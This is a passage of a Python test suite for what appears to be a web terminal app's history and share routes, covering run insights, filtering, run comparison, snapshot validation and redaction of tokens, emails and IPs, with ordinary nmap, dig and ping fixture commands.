            assert roots["nmap"]["count"] == 1
            assert roots["nmap"]["succeeded"] == 1
            assert roots["curl"]["failed"] == 1
            assert roots["ping"]["count"] == 1
            assert roots["ping"]["failed"] == 0
            assert roots["whois"]["count"] == 1
            assert any(item["root"] == "nmap" for item in data["constellation"])
            assert data["events"][0]["root"] == "sleep"

            fixed = json.loads(client.get("/history/insights?days=7", headers={"X-Session-ID": session}).data)
            assert fixed["days"] == 28
            assert len(fixed["activity"]) == 28
            assert fixed["windows"]["activity"]["days"] == 28
            assert fixed["windows"]["command_mix"]["days"] == 90
            assert any(item["root"] == "nmap" for item in fixed["command_mix"])
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_insights_filters_app_builtin_commands(self):
        # The Status Monitor's constellation, treemap, heatmap, events, and
        # max_day_count must all exclude synthetic app built-ins (pwd, whoami,
        # help, ...) so the visualizations reflect real recon work only.
        client = get_client()
        session = "history-insights-builtin-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-pwd",
            f"{session}-whoami",
            f"{session}-help",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_two = (now - timedelta(days=2)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[0], session, "nmap -sT ip.darklab.sh", day_two,
                     (now - timedelta(days=2, seconds=-30)).isoformat(), 0, "[]", 12),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[1], session, "pwd", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[2], session, "whoami", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 1),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (run_ids[3], session, "help", day_one,
                     (now - timedelta(days=1, seconds=-1)).isoformat(), 0, "[]", 5),
                )
                conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            mix_roots = {item["root"] for item in data["command_mix"]}
            constellation_roots = {item["root"] for item in data["constellation"]}
            event_roots = {item["root"] for item in data["events"]}
            assert "nmap" in mix_roots
            assert "nmap" in constellation_roots
            assert "nmap" in event_roots
            for builtin in ("pwd", "whoami", "help"):
                assert builtin not in mix_roots
                assert builtin not in constellation_roots
                assert builtin not in event_roots
            day_two_key = (now - timedelta(days=2)).date().isoformat()
            day_one_key = (now - timedelta(days=1)).date().isoformat()
            day_counts = {entry["date"]: entry["count"] for entry in data["activity"]}
            assert day_counts.get(day_two_key) == 1
            assert day_counts.get(day_one_key, 0) == 0
            assert data["max_day_count"] == 1
            assert data["windows"]["constellation"]["total_runs"] == 1
            assert data["windows"]["constellation"]["plotted_runs"] == 1
            assert data["windows"]["command_mix"]["total_runs"] == 1
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
                conn.commit()

    def test_delete_all_returns_ok(self):
        client = get_client()
        resp = client.delete("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_delete_specific_nonexistent_run_returns_ok(self):
        # Deleting a run_id that doesn't exist should still return ok (idempotent)
        client = get_client()
        resp = client.delete(
            "/history/nonexistent-run-id",
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        assert json.loads(resp.data)["ok"] is True

    def test_get_run_nonexistent_returns_404(self):
        client = get_client()
        resp = client.get("/history/nonexistent-run-id")
        assert resp.status_code == 404

    def test_history_respects_panel_limit_and_sorts_newest_first(self):
        client = get_client()
        session = "limit-test-session"
        run_ids = ["limit-run-1", "limit-run-2", "limit-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "echo one", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "echo two", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "echo three", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]"),
            )
            conn.commit()
            conn.close()

            with mock.patch.dict("config.CFG", {"history_panel_limit": 2}):
                resp = client.get("/history", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            commands = [r["command"] for r in data["runs"]]

            assert commands == ["echo three", "echo two"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_commands_returns_distinct_recent_commands_without_exit_filter(self):
        client = get_client()
        session = "commands-distinct-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-{i}" for i in range(5)]
        rows = [
            (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", 0),
            (run_ids[1], session, "curl -I https://darklab.sh", "2026-01-01T00:00:02", 7),
            (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:03", 1),
            (run_ids[3], session, "ping darklab.sh", "2026-01-01T00:00:04", 0),
            (run_ids[4], session, "nmap -sV darklab.sh", "2026-01-01T00:00:05", 2),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                [(run_id, sid, cmd, started, started, code, "[]") for run_id, sid, cmd, started, code in rows],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/commands?limit=3",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["commands"] == [
                "nmap -sV darklab.sh",
                "ping darklab.sh",
                "dig darklab.sh A",
            ]
            assert data["limit"] == 3
            assert len(data["runs"]) == 3
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_history_reports_totals_and_keeps_roots_complete_across_pages(self):
        client = get_client()
        session = "pagination-test-session"
        run_ids = ["page-run-1", "page-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -sV darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?page=2&page_size=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["page"] == 2
            assert data["page_size"] == 1
            assert data["total_count"] == 2
            assert data["page_count"] == 2
            assert data["has_prev"] is True
            assert data["has_next"] is False
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["nmap", "dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_applies_starred_only_server_side(self):
        client = get_client()
        session = "starred-filter-session"
        run_ids = ["star-run-1", "star-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "ping darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "dig darklab.sh A", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?starred_only=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["page_count"] == 1
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.execute(
                "DELETE FROM starred_commands WHERE session_id = ? AND command IN (?, ?)",
                (session, "ping darklab.sh", "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

    def test_history_can_return_snapshot_items(self):
        client = get_client()
        session = "snapshot-history-session"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                ("snap-history-1", session, "baseline scan", "2026-01-01T00:00:03", "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?type=snapshots&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["runs"] == []
            assert data["items"][0]["type"] == "snapshot"
            assert data["items"][0]["label"] == "baseline scan"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM snapshots WHERE id = ?", ("snap-history-1",))
            conn.commit()
            conn.close()

    def test_history_search_filters_by_command_text(self):
        client = get_client()
        session = "history-search-session"
        run_ids = ["search-run-1", "search-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "ping darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?q=dig", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_command_scope_excludes_output_matches(self):
        client = get_client()
        session = "history-command-scope-session"
        run_ids = ["command-scope-1", "command-scope-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[0],
                    session,
                    "file list",
                    "2026-01-01T00:00:01",
                    "2026-01-01T00:00:02",
                    0,
                    "[]",
                    "amass results.txt",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "amass enum -d darklab.sh",
                    "2026-01-01T00:00:03",
                    "2026-01-01T00:00:04",
                    0,
                    "[]",
                    "",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?type=runs&scope=command&q=amass", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["amass enum -d darklab.sh"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_command_root(self):
        client = get_client()
        session = "history-root-session"
        run_ids = ["root-run-1", "root-run-2", "root-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sV darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -Pn darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]", 0),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]", 1),
            )
            conn.commit()
            conn.close()

            resp = client.get("/history?command_root=nmap", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["nmap -Pn darklab.sh", "nmap -sV darklab.sh"]
            assert data["roots"] == ["nmap"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_by_exit_code_and_recent_date_range(self):
        client = get_client()
        session = "history-date-session"
        run_ids = ["date-run-1", "date-run-2", "date-run-3", "date-run-4"]
        recent = datetime.now().replace(microsecond=0)
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "curl recent ok", recent.isoformat(), (recent + timedelta(seconds=2)).isoformat(), 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[1],
                    session,
                    "curl recent fail",
                    (recent - timedelta(hours=1)).isoformat(),
                    (recent - timedelta(hours=1) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[2],
                    session,
                    "curl old fail",
                    (recent - timedelta(days=40)).isoformat(),
                    (recent - timedelta(days=40) + timedelta(seconds=2)).isoformat(),
                    2,
                    "[]",
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    run_ids[3],
                    session,
                    "ping stopped",
                    (recent - timedelta(minutes=30)).isoformat(),
                    (recent - timedelta(minutes=30) + timedelta(seconds=2)).isoformat(),
                    -15,
                    "[]",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?exit_code=nonzero&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["curl recent fail"]

            resp = client.get(
                "/history?exit_code=-15&date_range=24h",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)
            assert [r["command"] for r in data["runs"]] == ["ping stopped"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_active_history_returns_running_runs_for_this_session(self):
        client = get_client()
        session = f"session-{uuid.uuid4()}"
        active_runs = [
            {
                "run_id": "run-1",
                "command": "ping darklab.sh",
                "started": "2026-01-01T00:00:00Z",
            }
        ]

        with mock.patch("blueprints.history.active_runs_for_session", return_value=active_runs) as active_mock:
            resp = client.get(
                "/history/active",
                headers={"X-Session-ID": session, "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"runs": active_runs}
        active_mock.assert_called_once_with(session, client_id="client-1")

    def test_compare_candidates_rank_exact_command_before_same_target(self):
        client = get_client()
        session = "compare-candidates-" + uuid.uuid4().hex[:8]
        rows = [
            (
                "cmp-source",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:04",
                "2026-01-01T00:00:06",
                0,
                "[]",
            ),
            (
                "cmp-exact",
                session,
                "nmap -sV darklab.sh",
                "2026-01-01T00:00:03",
                "2026-01-01T00:00:05",
                0,
                "[]",
            ),
            (
                "cmp-target",
                session,
                "nmap -Pn darklab.sh",
                "2026-01-01T00:00:02",
                "2026-01-01T00:00:04",
                0,
                "[]",
            ),
            (
                "cmp-root",
                session,
                "nmap scanme.nmap.org",
                "2026-01-01T00:00:01",
                "2026-01-01T00:00:03",
                0,
                "[]",
            ),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                rows,
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/cmp-source/compare-candidates",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert [item["id"] for item in data["candidates"][:3]] == [
                "cmp-exact",
                "cmp-target",
                "cmp-root",
            ]
            assert data["candidates"][0]["confidence"] == "exact_command"
            assert data["candidates"][1]["confidence"] == "same_target"
            assert data["candidates"][2]["confidence"] == "same_command"
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_returns_metadata_and_changed_lines(self):
        client = get_client()
        session = "compare-runs-" + uuid.uuid4().hex[:8]
        left_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        right_output = json.dumps([
            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
            {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
            {"text": "[process exited with code 0]", "cls": "exit-ok"},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "cmp-left",
                    session,
                    "nmap darklab.sh",
                    "2026-01-01T00:00:01",
                    "2026-01-01T00:00:03",
                    0,
                    left_output,
                    4,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    "cmp-right",
                    session,
                    "nmap darklab.sh",
                    "2026-01-01T00:00:04",
                    "2026-01-01T00:00:09",
                    0,
                    right_output,
                    4,
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-left&right=cmp-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["left"]["command"] == "nmap darklab.sh"
            assert data["right"]["duration_seconds"] == 5
            assert data["deltas"]["duration_seconds"]["delta"] == 3
            assert data["deltas"]["findings"]["delta"] == 0
            assert len(data["sections"]["changed"]) == 1
            changed = data["sections"]["changed"][0]
            assert changed["removed"]["text"].endswith("23:22 UTC")
            assert changed["added"]["text"].endswith("23:21 UTC")
            assert any(segment["changed"] for segment in changed["removed"]["segments"])
            assert any(segment["changed"] for segment in changed["added"]["segments"])
            assert [line["text"] for line in data["sections"]["added"]] == ["443/tcp open https"]
            assert [line["text"] for line in data["sections"]["removed"]] == ["8080/tcp open http-proxy"]
            assert all("process exited" not in line["text"] for line in data["sections"]["added"])
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()


# ── /share ────────────────────────────────────────────────────────────────────

class TestShareRoute:
    def test_post_creates_snapshot(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "test snapshot", "content": ["line1", "line2"]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data
        assert "url" in data

    def test_post_rejects_non_string_label(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": 123, "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Label must be a string"

    def test_post_rejects_non_list_content(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": {"text": "line"}},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content must be a list"

    def test_post_rejects_invalid_content_item(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": ["ok", 123]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content items must be strings or objects"

    def test_post_rejects_content_object_without_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": 123, "cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_cls(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": "hello", "cls": 123}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must use string cls values"

    def test_post_accepts_renderable_content_objects(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "good content",
                "content": [
                    {"text": "$ echo hi", "cls": "cmd", "tsC": "2026-01-01 00:00:00"},
                    {"text": "hi", "cls": "notice"},
                ],
            },
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data

    def test_post_applies_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [
                {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
            ],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "good content",
                    "content": [
                        {"text": "Authorization: Bearer abc123", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "Authorization: Bearer [redacted]"

    def test_post_applies_builtin_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "builtin redaction",
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact [email-redacted] at [ip-redacted]"

    def test_post_skips_share_redaction_when_apply_redaction_false(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "raw share",
                    "apply_redaction": False,
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact admin@example.com at 203.0.113.10"

    def test_post_rejects_non_boolean_apply_redaction(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "bad share",
                "apply_redaction": "yes",
                "content": [{"text": "line 1", "cls": ""}],
            },
            headers={"X-Session-ID": "test-session"},
        )
        assert resp.status_code == 400
        data = json.loads(resp.data)
        assert data["error"] == "apply_redaction must be a boolean"

    def test_post_rejects_non_object_json(self):
        client = get_client()
        resp = client.post(
            "/share",
            json=["bad", "payload"],
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"

    def test_get_nonexistent_share_returns_404(self):
        client = get_client()
        resp = client.get("/share/nonexistent-share-id")
        assert resp.status_code == 404

    def test_delete_share_removes_snapshot_for_current_session(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "delete-me", "content": ["line"]},
            headers={"X-Session-ID": "delete-share-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.delete(
            f"/share/{share_id}",
            headers={"X-Session-ID": "delete-share-session"},
        )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"ok": True}
        assert client.get(f"/share/{share_id}").status_code == 404

    def test_get_share_json_returns_content(self):
        client = get_client()
        # Create a snapshot first
        create_resp = client.post(
            "/share",
            json={"label": "my label", "content": ["hello", "world"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]

        # Fetch it as JSON
        resp = client.get(f"/share/{share_id}?json")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["label"] == "my label"
        assert "hello" in data["content"]

    def test_get_share_html_returns_page(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "html test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert resp.status_code == 200
        assert b"<html" in resp.data.lower()

    def test_get_share_html_honors_theme_name_cookie(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "theme selector test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        client.set_cookie("pref_theme_name", "apricot_sand")
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'class="permalink-page"' in body
        assert 'data-theme="apricot_sand"' in body
        assert '/static/css/styles.css' in body

    def test_get_share_html_contains_label(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "unique-label-xyz", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert b"unique-label-xyz" in resp.data

    def test_get_share_html_does_not_prepend_label_for_structured_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "curl http://localhost:5001/config",
                "content": [
                    {"text": "$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                    {"text": "[process exited with code 0 in 0.1s]", "cls": "exit-ok"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        assert "$ ping -c 4 [host-redacted]" in body
        assert "$ curl http://localhost:5001/config" not in body

    def test_get_share_html_includes_prompt_echo_renderer_for_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "prompt-style-test",
                "content": [
                    {"text": "anon@darklab:~$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        # renderPromptEcho is now in the external permalink.js module; the page
        # loads it and bridges data via window.PermData.  Confirm both are present.
        assert "permalink.js" in body
        assert "prompt-echo" in body

    def test_get_share_html_content_type(self):
        client = get_client()
        create_resp = client.post(
